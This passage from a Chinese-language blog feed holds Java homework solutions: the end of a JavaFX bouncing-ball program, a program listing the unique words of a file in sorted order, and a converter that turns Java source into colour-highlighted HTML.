                <span class="token keyword">if</span> <span class="token punctuation">(</span>ball<span class="token punctuation">.</span><span class="token function">getCenterX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> ball<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> ball<span class="token punctuation">.</span><span class="token function">getCenterX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ball<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    ball<span class="token punctuation">.</span>dx <span class="token operator">*=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>ball<span class="token punctuation">.</span><span class="token function">getCenterY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> ball<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> ball<span class="token punctuation">.</span><span class="token function">getCenterY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ball<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    ball<span class="token punctuation">.</span>dy <span class="token operator">*=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token comment">// 更新球的位置</span>
                ball<span class="token punctuation">.</span><span class="token function">setCenterX</span><span class="token punctuation">(</span>ball<span class="token punctuation">.</span>dx <span class="token operator">+</span> ball<span class="token punctuation">.</span><span class="token function">getCenterX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                ball<span class="token punctuation">.</span><span class="token function">setCenterY</span><span class="token punctuation">(</span>ball<span class="token punctuation">.</span>dy <span class="token operator">+</span> ball<span class="token punctuation">.</span><span class="token function">getCenterY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">class</span> <span class="token class-name">Ball</span> <span class="token keyword">extends</span> <span class="token class-name">Circle</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Ball</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">double</span> dx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> dy <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

        <span class="token class-name">Ball</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">,</span> <span class="token keyword">double</span> y<span class="token punctuation">,</span> <span class="token keyword">double</span> radius<span class="token punctuation">,</span> <span class="token class-name">Color</span> color<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">setFill</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 实现比较接口用于排序</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Ball</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pitYYlR.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/16/pitYYlR.png'">
<h2 id="从文本文件中读取单词并将所有不重复的单词按照升序显示文本文件作为命令行参数传递"><a class="markdownIt-Anchor" href="#从文本文件中读取单词并将所有不重复的单词按照升序显示文本文件作为命令行参数传递"></a> 从文本文件中读取单词，并将所有不重复的单词按照升序显示，文本文件作为命令行参数传递</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">TreeSet</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test2102</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// 检查命令行参数</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Usage: java Test2102 filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从命令行参数获取文件名</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> treeSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Scanner</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">String</span> line <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment">// 使用正则表达式分割字符串</span>
                    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tokens <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\s+|\\.|,|\\(|\\)|\"|'|;|-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> token <span class="token operator">:</span> tokens<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 检查分割出的字符串是否为空</span>
                            treeSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Error reading file: "</span> <span class="token operator">+</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"File "</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 输出不重复的单词</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>treeSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pitYt61.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/16/pitYt61.png'">
<h2 id="将一个java文件转换成一个html文件在html中关键词-注释和字面量分别用粗体的深蓝色-绿色和蓝色显示-使用命令行传递java文件和html文件"><a class="markdownIt-Anchor" href="#将一个java文件转换成一个html文件在html中关键词-注释和字面量分别用粗体的深蓝色-绿色和蓝色显示-使用命令行传递java文件和html文件"></a> 将一个Java文件转换成一个HTML文件，在HTML中，关键词、注释和字面量分别用粗体的深蓝色、绿色和蓝色显示。使用命令行传递Java文件和HTML文件</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test2105</span> <span class="token punctuation">{</span>
    <span class="token comment">// Java关键词列表</span>
    <span class="token keyword">static</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keywordString <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"abstract"</span><span class="token punctuation">,</span> <span class="token string">"assert"</span><span class="token punctuation">,</span> <span class="token string">"boolean"</span><span class="token punctuation">,</span>
            <span class="token string">"break"</span><span class="token punctuation">,</span> <span class="token string">"byte"</span><span class="token punctuation">,</span> <span class="token string">"case"</span><span class="token punctuation">,</span> <span class="token string">"catch"</span><span class="token punctuation">,</span> <span class="token string">"char"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"const"</span><span class="token punctuation">,</span>
            <span class="token string">"continue"</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">,</span> <span class="token string">"do"</span><span class="token punctuation">,</span> <span class="token string">"double"</span><span class="token punctuation">,</span> <span class="token string">"else"</span><span class="token punctuation">,</span> <span class="token string">"enum"</span><span class="token punctuation">,</span>
            <span class="token string">"extends"</span><span class="token punctuation">,</span> <span class="token string">"for"</span><span class="token punctuation">,</span> <span class="token string">"final"</span><span class="token punctuation">,</span> <span class="token string">"finally"</span><span class="token punctuation">,</span> <span class="token string">"float"</span><span class="token punctuation">,</span> <span class="token string">"goto"</span><span class="token punctuation">,</span> <span class="token string">"if"</span><span class="token punctuation">,</span>
            <span class="token string">"implements"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"instanceof"</span><span class="token punctuation">,</span> <span class="token string">"int"</span><span class="token punctuation">,</span> <span class="token string">"interface"</span><span class="token punctuation">,</span>
            <span class="token string">"long"</span><span class="token punctuation">,</span> <span class="token string">"native"</span><span class="token punctuation">,</span> <span class="token string">"new"</span><span class="token punctuation">,</span> <span class="token string">"package"</span><span class="token punctuation">,</span> <span class="token string">"private"</span><span class="token punctuation">,</span> <span class="token string">"protected"</span><span class="token punctuation">,</span>
            <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"return"</span><span class="token punctuation">,</span> <span class="token string">"short"</span><span class="token punctuation">,</span> <span class="token string">"static"</span><span class="token punctuation">,</span> <span class="token string">"strictfp"</span><span class="token punctuation">,</span> <span class="token string">"super"</span><span class="token punctuation">,</span>
            <span class="token string">"switch"</span><span class="token punctuation">,</span> <span class="token string">"synchronized"</span><span class="token punctuation">,</span> <span class="token string">"this"</span><span class="token punctuation">,</span> <span class="token string">"throw"</span><span class="token punctuation">,</span> <span class="token string">"throws"</span><span class="token punctuation">,</span>
            <span class="token string">"transient"</span><span class="token punctuation">,</span> <span class="token string">"try"</span><span class="token punctuation">,</span> <span class="token string">"void"</span><span class="token punctuation">,</span> <span class="token string">"volatile"</span><span class="token punctuation">,</span> <span class="token string">"while"</span><span class="token punctuation">,</span>
            <span class="token string">"true"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> <span class="token string">"null"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 检查命令行参数</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Usage: java Test2105 sourceFile targetFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">File</span> sourceFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">File</span> targetFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sourceFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Source file "</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> keywordSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>keywordString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 读取源文件并转换为HTML格式</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Scanner</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">PrintWriter</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"&lt;html&gt;&lt;body&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> line <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 处理每一行的内容</span>
                <span class="token class-name">String</span> htmlLine <span class="token operator">=</span> <span class="token function">processLine</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> keywordSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>htmlLine<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/body&gt;&lt;/html&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            output<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 处理一行文本，转换为HTML格式</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">processLine</span><span class="token punctuation">(</span><span class="token class-name">String</span> line<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> keywordSet<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 使用StringBuilder而不是StringBuffer，因为它在单线程中效率更高</span>
        <span class="token class-name">StringBuilder</span> htmlLine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 检查是否为单行注释</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"&lt;p style=\"color:green\"&gt;"</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 分割字符串以处理可能的注释和字面量</span>
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tokens <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 处理每个分割出的部分</span>
        <span class="token keyword">boolean</span> isLiteral <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 标记是否处于字符串字面量中</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> token <span class="token operator">:</span> tokens<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>isLiteral<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 字符串字面量用蓝色显示</span>
                htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;font color=blue&gt;\""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\"&lt;/font&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                isLiteral <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// 分割非字面量部分以进一步处理关键词和注释</span>
                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> words <span class="token operator">=</span> token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"[\\s+()]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> word <span class="token operator">:</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>keywordSet<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 关键词用粗体深蓝色显示</span>
                        htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;font color=darkblue&gt;&lt;b&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/b&gt;&lt;/font&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>word<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 单行注释用绿色显示</span>
                        htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;font color=green&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token comment">// 注释之后的内容全部视为注释</span>
                        htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>word<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                isLiteral <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 每一行结束后添加换行标记</span>
        htmlLine<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;br&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> htmlLine<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pitYNOx.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/16/pitYNOx.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Jetson配置</title>
    <url>/2025/01/05/13-32-56/</url>
